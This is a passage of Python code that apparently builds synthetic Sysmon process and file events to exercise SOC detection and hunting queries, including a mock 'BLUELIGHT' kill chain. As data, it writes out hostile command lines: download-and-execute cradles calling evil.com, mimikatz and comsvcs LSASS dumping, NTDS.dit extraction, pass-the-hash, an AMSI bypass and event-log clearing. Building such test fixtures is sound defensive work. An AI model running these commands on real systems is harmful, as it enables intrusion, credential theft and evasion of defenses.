        "netsh advfirewall firewall delete rule name=WindowsDefenderFirewall",
    ]
    for i, cmd in enumerate(fw_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\netsh.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=410+i,
        ))

    # ── RDP Lateral Movement ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:192.168.1.50",
        parent_image="C:\\Windows\\explorer.exe",
        offset=420,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:DC01.corp.local /admin",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=421,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\reg.exe",
        command_line='reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=422,
    ))

    # ── Scheduled Task Creation via Schtasks ──
    schtask_cmds = [
        "schtasks.exe /create /sc minute /mo 5 /tn PersistTask /tr C:\\Temp\\backdoor.exe /ru SYSTEM",
        "schtasks /create /tn Updater /tr C:\\Windows\\Temp\\svc.exe /sc onlogon",
    ]
    for i, cmd in enumerate(schtask_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\schtasks.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=430+i,
        ))

    # ── PowerShell Download Cradle ──
    ps_download_cmds = [
        ("powershell.exe", "powershell.exe -c Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Temp\\payload.exe"),
        ("powershell.exe", "powershell.exe -c (New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1') | IEX"),
        ("pwsh.exe", "pwsh.exe -c (New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\\Temp\\p.exe')"),
        ("powershell.exe", "powershell.exe Start-BitsTransfer -Source http://evil.com/payload.exe -Destination C:\\Temp\\payload.exe"),
        ("powershell.exe", "powershell.exe Invoke-RestMethod -Uri http://evil.com/api/config | IEX"),
    ]
    for i, (binary, cmd) in enumerate(ps_download_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\{binary}" if binary == "powershell.exe" else f"C:\\Program Files\\PowerShell\\7\\{binary}",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=440+i,
        ))

    # ── LSASS Memory Access via comsvcs.dll ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=450,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).Id C:\\Temp\\out.dmp full",
        parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        host="DC01.corp.local",
        offset=451,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 3): Advanced Windows Detection Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Event Log Clearing ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil.exe cl Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=500,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil cl System",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=501,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Clear-EventLog -LogName Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=502,
    ))

    # ── PsExec Remote Execution ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec.exe",
        command_line="psexec.exe \\\\DC01 -accepteula -s cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=510,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec64.exe",
        command_line="psexec64.exe \\\\192.168.1.50 -accepteula -u admin -p P@ss cmd /c whoami",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=511,
    ))

    # ── UAC Bypass ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\fodhelper.exe",
        command_line="fodhelper.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=520,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\eventvwr.exe",
        command_line="eventvwr.exe",
        parent_image="C:\\Temp\\malware.exe",
        offset=521,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\sdclt.exe",
        command_line="sdclt.exe /kickoffelev",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=522,
    ))

    # ── Kerberoasting ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\Rubeus.exe",
        command_line="Rubeus.exe kerberoast /outfile:hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=530,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=531,
    ))

    # ── BITS Job Persistence ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\bitsadmin.exe",
        command_line="bitsadmin /SetNotifyCmdLine PersistJob C:\\Temp\\backdoor.exe NULL",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=540,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\bitsadmin.exe",
        command_line="bitsadmin /AddFile DownloadJob http://evil.com/payload.exe C:\\Temp\\payload.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=541,
    ))

    # ── MSBuild Code Execution ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
        command_line="MSBuild.exe C:\\Temp\\payload.csproj",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=550,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe",
        command_line="MSBuild.exe C:\\Users\\Public\\inline.xml",
        parent_image="C:\\Windows\\explorer.exe",
        offset=551,
    ))

    # ── Pass-the-Hash Indicators ──
    pth_cmds = [
        ("powershell.exe", "powershell.exe Invoke-SMBExec -Target 192.168.1.50 -Hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"),
        ("powershell.exe", "powershell.exe Invoke-WMIExec -Target DC01 -Hash 31d6cfe0d16ae931b73c59d7e0c089c0 -Command whoami"),
        ("C:\\Tools\\crackmapexec.exe", "crackmapexec smb 192.168.1.0/24 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0"),
    ]
    for i, (image, cmd) in enumerate(pth_cmds):
        img = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in image else image
        events.append(sysmon_event(
            event_id=1,
            image=img,
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            host="DC01.corp.local",
            offset=560+i,
        ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\runas.exe",
        command_line="runas.exe /netonly /user:CORP\\admin cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=563,
    ))

    # ── Process Hollowing Indicators ──
    hollow_cmds = [
        "C:\\Temp\\injector.exe NtUnmapViewOfSection WriteProcessMemory NtResumeThread",
        "C:\\Temp\\hollow.exe CREATE_SUSPENDED svchost.exe",
    ]
    for i, cmd in enumerate(hollow_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Temp\\injector.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=570+i,
        ))

    # ── WDigest Credential Harvest ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\reg.exe",
        command_line='reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=580,
    ))

    # ── NTDS.dit Extraction ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\ntdsutil.exe",
        command_line='ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds_dump" q q',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=590,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\cmd.exe",
        command_line="cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=591,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 4): MITRE Tactic Expansion - Windows Events
    # ═══════════════════════════════════════════════════════════════

    # ── Account Discovery (T1087) ──
    acct_disc_cmds = [
        ("C:\\Windows\\System32\\net.exe", "net user /domain"),
        ("C:\\Windows\\System32\\net.exe", "net group /domain"),
        ("C:\\Windows\\System32\\net.exe", "net localgroup administrators"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-ADUser -Filter * -Properties *"),
        ("C:\\Windows\\System32\\dsquery.exe", "dsquery user -name * -limit 500"),
    ]
    for i, (image, cmd) in enumerate(acct_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=650+i,
        ))

    # ── Network Share Discovery (T1135) ──
    share_disc_cmds = [
        ("C:\\Windows\\System32\\net.exe", "net share"),
        ("C:\\Windows\\System32\\net.exe", "net view \\\\DC01"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-SmbShare"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Invoke-ShareFinder -ComputerName DC01"),
    ]
    for i, (image, cmd) in enumerate(share_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=660+i,
        ))

    # ── Remote System Discovery (T1018) ──
    remote_disc_cmds = [
        ("C:\\Windows\\System32\\arp.exe", "arp.exe -a"),
        ("C:\\Windows\\System32\\nslookup.exe", "nslookup DC01.corp.local"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Test-Connection -ComputerName DC01 -Count 1"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Get-ADComputer -Filter * -Properties IPv4Address"),
        ("C:\\Windows\\System32\\cmd.exe", 'cmd.exe /c "for /l %i in (1,1,254) do @ping -n 1 192.168.1.%i"'),
    ]
    for i, (image, cmd) in enumerate(remote_disc_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=670+i,
        ))

    # ── Spearphishing Attachment Execution (T1566.001) ──
    phishing_cmds = [
        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c powershell -ep bypass -c IEX(IWR http://evil.com/ps.ps1)", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoP -Sta -W 1 -Enc JABjAGwA", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"),
        ("C:\\Windows\\System32\\mshta.exe", "mshta.exe http://evil.com/payload.hta", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
    ]
    for i, (image, cmd, parent) in enumerate(phishing_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image=parent,
            offset=680+i,
        ))

    # ── Data Staging for Exfiltration (T1074.001) ──
    staging_cmds = [
        ("C:\\Windows\\System32\\robocopy.exe", "robocopy.exe C:\\Users\\admin\\Documents C:\\Users\\Public\\staging /MIR"),
        ("C:\\Windows\\System32\\xcopy.exe", "xcopy.exe C:\\Shares\\Finance C:\\Temp\\staging /S /E"),
        ("C:\\Windows\\System32\\compact.exe", "compact /c C:\\Temp\\staging"),
    ]
    for i, (image, cmd) in enumerate(staging_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=690+i,
        ))

    # ── Keylogger Indicators (T1056.001) ──
    keylogger_cmds = [
        "powershell.exe Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey);' -Name kb -Namespace k",
        "C:\\Temp\\keylogger.exe --output C:\\Temp\\keystrokes.txt",
    ]
    for i, cmd in enumerate(keylogger_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Temp\\keylogger.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=700+i,
        ))

    # ── Screen Capture (T1113) ──
    screenshot_cmds = [
        "powershell.exe -c [System.Drawing.Graphics]::CopyFromScreen(0,0,0,0,[System.Drawing.Size]::new(1920,1080))",
        "nircmd.exe savescreenshot C:\\Temp\\screenshot.png",
    ]
    for i, cmd in enumerate(screenshot_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Tools\\nircmd.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=710+i,
        ))

    # ── Remote Access Tools (T1219) ──
    rat_cmds = [
        ("C:\\Program Files\\AnyDesk\\AnyDesk.exe", "AnyDesk.exe --start-service"),
        ("C:\\Users\\analyst\\Downloads\\ngrok.exe", "ngrok.exe tcp 3389"),
        ("C:\\Program Files\\TeamViewer\\TeamViewer.exe", "TeamViewer.exe"),
    ]
    for i, (image, cmd) in enumerate(rat_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=720+i,
        ))

    # ── Access Token Manipulation (T1134) ──
    token_cmds = [
        "powershell.exe Invoke-TokenManipulation -Enumerate",
        "C:\\Temp\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a '/c C:\\Temp\\payload.exe' -t *",
        "C:\\Temp\\PrintSpoofer.exe -i -c cmd.exe",
        "powershell.exe token::elevate",
    ]
    for i, cmd in enumerate(token_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else cmd.split()[0],
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=730+i,
        ))

    # ═══════════════════════════════════════════════════════════════
    #  HUNTING: High-volume events for aggregation-based queries
    # ═══════════════════════════════════════════════════════════════

    # ── Long Command Line: Extra-long encoded payloads (>500 chars) ──
    long_payload = "A" * 600  # Simulates base64-encoded payload
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {long_payload}",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=600,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\cmd.exe",
        command_line=f"cmd.exe /c echo {long_payload} | certutil -decode - C:\\Temp\\payload.exe",
        parent_image="C:\\Windows\\explorer.exe",
        offset=601,
    ))

    # ── Lateral Movement Cluster: Multiple tools on same host ──
    pivot_host = "SRV01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec.exe",
        command_line="psexec.exe \\\\DC01 -accepteula -s cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=610,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:DC01.corp.local /admin",
        parent_image="C:\\Windows\\explorer.exe",
        host=pivot_host,
        offset=611,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Enter-PSSession -ComputerName DC01",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=612,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\net.exe",
        command_line="net use \\\\DC01\\c$ /user:CORP\\admin P@ssw0rd",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=pivot_host,
        offset=613,
    ))

    # ── Credential Access Cluster: Multiple techniques on same host ──
    cred_host = "DC01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\mimikatz.exe",
        command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=620,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=621,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\Rubeus.exe",
        command_line="Rubeus.exe kerberoast /outfile:hashes.txt",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=622,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\ntdsutil.exe",
        command_line='ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Temp\\ntds" q q',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=cred_host, user="CORP\\admin",
        offset=623,
    ))

    # ── Defense Evasion Score: Multiple evasion techniques on same host ──
    evasion_host = "WS01.corp.local"
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil.exe cl Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=630,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=631,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\netsh.exe",
        command_line="netsh advfirewall set allprofiles state off",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host=evasion_host,
        offset=632,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\fodhelper.exe",
        command_line="fodhelper.exe",
        parent_image="C:\\Temp\\malware.exe",
        host=evasion_host,
        offset=633,
    ))

    # ── Unusual Process Paths: Processes from non-standard locations ──
    unusual_procs = [
        ("C:\\Users\\Public\\evil.exe", "C:\\Users\\Public\\evil.exe --connect 10.0.0.1"),
        ("C:\\Users\\analyst\\Downloads\\tool.exe", "tool.exe -scan -all"),
        ("C:\\Users\\analyst\\AppData\\Local\\Temp\\update.exe", "update.exe --install"),
    ]
    for i, (image, cmd) in enumerate(unusual_procs):
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=640+i,
        ))

    events.extend(_bluelight_kill_chain_sysmon_events())

    # ── Rare processes (Hunt: Windows Rare Processes) ──
    # The hunting query thresholds executions < 80 across the 14-day window.
    # Emit a handful of unique binaries that appear exactly once each so the
    # rare-process tail of the distribution is non-empty when the dataset is
    # multiplied by ``expand_events_over_days``.
    rare_binaries = [
        ("C:\\Tools\\rare_recon.exe", "rare_recon.exe -enum users"),
        ("C:\\Users\\Public\\beacon_unique.exe", "beacon_unique.exe -c attacker.example"),
        ("C:\\Temp\\loader_x42.exe", "loader_x42.exe /quiet /payload"),
        ("C:\\Tools\\custom_persist.exe", "custom_persist.exe install"),
        ("C:\\Users\\Public\\anomaly_dropper.exe", "anomaly_dropper.exe stage"),
        ("C:\\ProgramData\\unique_loader.exe", "unique_loader.exe /run"),
    ]
    for i, (image, cmd) in enumerate(rare_binaries):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=900 + i,
        ))

    return events


def _bluelight_kill_chain_sysmon_events():
    """Mirror of the kill-chain emitter into the SOC Windows Sysmon Logs source.

    The SOC Windows Sysmon parser has a longer-established field set, so emitting
    the same scenarios here gives the per-widget detections two routes to match —
    important when the Sysmon Operational parser's freshly-registered fields
    have not yet propagated.
    """
    events = []
    apt_host = "WS01.sevenkingdoms.local"
    apt_user = "joffrey"
    apt_image = "C:\\Users\\Public\\bluelight.exe"
    iexplore = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    cmd = "C:\\Windows\\System32\\cmd.exe"
    base = 1000

    file_discovery_cmds = [
        ("dir /s /b C:\\Users\\joffrey\\Documents", iexplore, cmd),
        ("dir /s C:\\Users\\joffrey\\Desktop\\*.docx", iexplore, cmd),
        ("powershell -Command Get-ChildItem -Recurse -Path C:\\Users -Filter *.pdf",
         iexplore, powershell),
        ("tree C:\\Users\\joffrey /F", "C:\\Windows\\System32\\wscript.exe", cmd),
    ]
    for i, (cl, parent, image) in enumerate(file_discovery_cmds):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cl,
            parent_image=parent, host=apt_host, user=apt_user,
            msg="BLUELIGHT: file discovery from browser child",
            offset=base + i,
        ))

    sec_paths = [
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        "HKLM\\SOFTWARE\\Microsoft\\Security Center\\SecurityCenter2",
        "HKLM\\SOFTWARE\\Windows Defender\\Exclusions",
        "HKLM\\SOFTWARE\\AVAST Software\\Avast",
        "HKLM\\SOFTWARE\\ESET\\ESET Security",
        "HKLM\\SOFTWARE\\KasperskyLab\\AVP",
    ]
    for i, target in enumerate(sec_paths):
        events.append(sysmon_event(
            event_id=12 + (i % 3), image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_object=target,
            msg="BLUELIGHT: registry enumeration of security products",
            offset=base + 50 + i,
        ))

    yara_pdb_cmds = [
        "C:\\Development\\BACKDOOR\\ncov\\Release\\bluelight.pdb",
        "powershell -Command Get-Content C:\\Users\\Public\\Release\\bluelight.pdb",
    ]
    for i, cl in enumerate(yara_pdb_cmds):
        events.append(sysmon_event(
            event_id=1, image=apt_image, command_line=cl,
            parent_image=cmd, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: PDB path indicator",
            offset=base + 100 + i,
        ))
    events.append(sysmon_event(
        event_id=11, image=apt_image, command_line="",
        parent_image=apt_image, host=apt_host, user=apt_user,
        target_filename="C:\\Users\\Public\\BACKDOOR\\ncov\\bluelight.pdb",
        msg="BLUELIGHT YARA: PDB file write",
        offset=base + 110,
    ))

    yara_recon_cmds = [
        'curl https://ipinfo.io/json',
        'powershell -Command Invoke-WebRequest -Uri https://ipinfo.io',
        'cmd /c echo {"UserName":"joffrey","ComName":"WS01","OnlineIP":"203.0.113.10","LocalIP":"10.0.1.10","AntiVirus":"Windows Defender","Process Level":"Medium","VM":"false"}',
    ]
    for i, cl in enumerate(yara_recon_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=apt_image if i == 2 else powershell,
            command_line=cl,
            parent_image=apt_image, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: system reconnaissance JSON",
            offset=base + 130 + i,
        ))

    yara_cookie_cmds = [
        'powershell -Command "cookie_name: OSID, cookie_name: SID, __Secure-3PSID"',
        'cmd /c echo cookie_name: __Secure-3PSID',
        'powershell -Command "Failed to get chrome cookie"',
        'powershell -Command "Failed to get Edge cookie database"',
        'cmd /c echo GM_ACTION_TOKEN=abc GM_ID_KEY=xyz',
        'cmd /c echo mail/u/0/?ik=abc Success to enable imap',
        'cmd /c echo Success to enable thunder access',
    ]
    for i, cl in enumerate(yara_cookie_cmds):
        events.append(sysmon_event(
            event_id=1, image=apt_image, command_line=cl,
            parent_image=apt_image, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: chrome/edge cookie theft",
            offset=base + 150 + i,
        ))

    keylog_files = [
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\cheV01.dat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\INTEG.RAW",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.dat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.log",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.chk",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.log",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00001.jrs",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00002.jrs",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbtmp.log",
    ]
    for i, path in enumerate(keylog_files):
        events.append(sysmon_event(
            event_id=11, image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_filename=path,
            msg="BLUELIGHT YARA: keylogger staging",
            offset=base + 200 + i,
        ))

    yara_google_cmds = [
        'cmd /c echo Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5',
        'cmd /c echo User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:80.0) Gecko/20100101 Firefox/80.0',
        'cmd /c echo AccountSettingsUi/data/batchexecute SNlM0e BqLdsd token',
    ]
    for i, cl in enumerate(yara_google_cmds):
        events.append(sysmon_event(
            event_id=1, image=apt_image, command_line=cl,
            parent_image=apt_image, host=apt_host, user=apt_user,
            msg="BLUELIGHT YARA: Google App C2 indicator",
            offset=base + 230 + i,
        ))

    ingress_files = [
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stage2.exe",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\loader.dll",
        "C:\\Users\\Public\\AppData\\Roaming\\update.scr",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\runner.bat",
        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stager.ps1",
    ]
    for i, path in enumerate(ingress_files):
        events.append(sysmon_event(
            event_id=11, image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_filename=path,
            msg="BLUELIGHT: ingress tool transfer",
            offset=base + 260 + i,
        ))

    wmi_cmds = [
        "powershell -Command Get-WmiObject -Class Win32_ComputerSystem",
        "powershell -Command Get-CimInstance -ClassName Win32_OperatingSystem",
        "wmic.exe path Win32_Processor get Name",
        "wmic.exe path Win32_NetworkAdapterConfiguration get IPAddress",
    ]
    for i, cl in enumerate(wmi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=powershell if "powershell" in cl else "C:\\Windows\\System32\\wbem\\wmic.exe",
            command_line=cl,
            parent_image=iexplore, host=apt_host, user=apt_user,
            msg="BLUELIGHT: WMI system enumeration from browser child",
            offset=base + 300 + i,
        ))

    child_proc_set = [
        ("cmd.exe /c whoami", cmd),
        ("powershell.exe -NoProfile -Command Get-Process", powershell),
        ("wscript.exe C:\\Users\\Public\\loader.vbs", "C:\\Windows\\System32\\wscript.exe"),
        ("mshta.exe http://203.0.113.20/payload.hta", "C:\\Windows\\System32\\mshta.exe"),
        ("cscript.exe //e:vbs C:\\Users\\Public\\dropper.vbs", "C:\\Windows\\System32\\cscript.exe"),
        ("rundll32.exe C:\\Users\\Public\\stage.dll,RunMain", "C:\\Windows\\System32\\rundll32.exe"),
    ]
    for i, (cl, image) in enumerate(child_proc_set):
        events.append(sysmon_event(
            event_id=1, image=image, command_line=cl,
            parent_image=iexplore, host=apt_host, user=apt_user,
            msg="BLUELIGHT: browser spawning suspicious child process",
            offset=base + 330 + i,
        ))

    for i, browser in enumerate([
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Internet Explorer\\iexplore.exe",
    ]):
        events.append(sysmon_event(
            event_id=10, image=apt_image, command_line="",
            parent_image=apt_image, host=apt_host, user=apt_user,
            target_image=browser, granted_access="0x1fffff",
